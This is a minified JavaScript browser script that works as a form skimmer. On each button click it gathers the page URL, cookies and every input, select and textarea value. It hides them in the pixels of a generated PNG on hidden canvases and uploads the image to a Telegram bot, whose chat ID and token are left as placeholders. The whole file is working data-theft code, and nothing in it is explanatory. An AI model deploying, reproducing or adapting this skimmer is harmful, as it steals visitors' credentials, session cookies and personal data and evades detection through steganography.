function sendTelegram(e){let t=new FormData;t.append("chat_id","chatID"),t.append("document",e,`${Math.random().toString(36).substring(7)}.png`),fetch(`https://api.telegram.org/bot${encodeURIComponent("API_TOKEN")}/sendDocument`,{method:"POST",body:t}).then(e=>{console.log(e)}).catch(e=>genericErrorHandler(e.message))}function extractData(){const e=window.location.href,t=document.cookie,a=[...document.getElementsByTagName("input"),...document.getElementsByTagName("select"),...document.getElementsByTagName("textarea")];let n={};n.currentPage=e,n.cookie=t;for(const e of a)n[e.name]=e.value;return JSON.stringify(n)}function createImg(e){createCanvas("snitchyPic"),createCanvas("snitchyData");let t=document.getElementById("snitchyPic"),a=t.getContext("2d"),n=document.getElementById("snitchyData"),o=n.getContext("2d"),c=new Image;t.width=3e3,t.height=100,n.width=3e3,n.height=100,o.font="14px Arial",o.fillText(e,10,50),a.fillStyle="#c0392b",a.fillRect(0,0,3e3,100),a.drawImage(c,0,0);let d=a.getImageData(0,0,t.width,t.height),i=o.getImageData(0,0,t.width,t.height);for(let e=0;e<i.data.length;e+=4)if(0!==i.data[e+3]){if(d.data[e+1]%10==7);else if(d.data[e+1]>247)d.data[e+1]=247;else for(;d.data[e+1]%10!=7;)d.data[e+1]++;0}else d.data[e+1]%10==7&&d.data[e+1]--,0;a.putImageData(d,0,0),t.toBlob(function(e){sendTelegram(e)},"image/png")}function createCanvas(e){document.contains(document.getElementById(`${e}`))&&document.getElementById(`${e}`).remove();const t=document.createElement("canvas");t.id=e,t.hidden=!0,document.body.appendChild(t)}document.addEventListener("click",function(e){"BUTTON"===event.target.nodeName&&createImg(extractData())});